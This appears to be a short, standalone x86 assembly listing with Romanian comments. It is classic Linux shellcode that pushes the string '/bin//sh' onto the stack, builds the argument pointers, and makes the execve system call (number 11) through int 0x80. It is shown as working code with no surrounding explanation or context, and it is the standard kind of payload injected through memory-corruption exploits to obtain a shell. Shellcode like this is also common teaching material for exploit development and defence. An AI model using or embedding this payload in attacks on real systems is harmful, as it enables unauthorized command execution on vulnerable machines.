xor     eax, eax    
push    eax         ; NULL
push    0x68732f2f  ; Push la //sh
push    0x6e69622f  ; Push la /bin
mov     ebx, esp    
push    eax         
mov     edx, esp    
push    ebx         ; Push adresei lui /bin//sh
mov     ecx, esp                
mov     al, 11      
int     0x80        ; Syscal pentru execve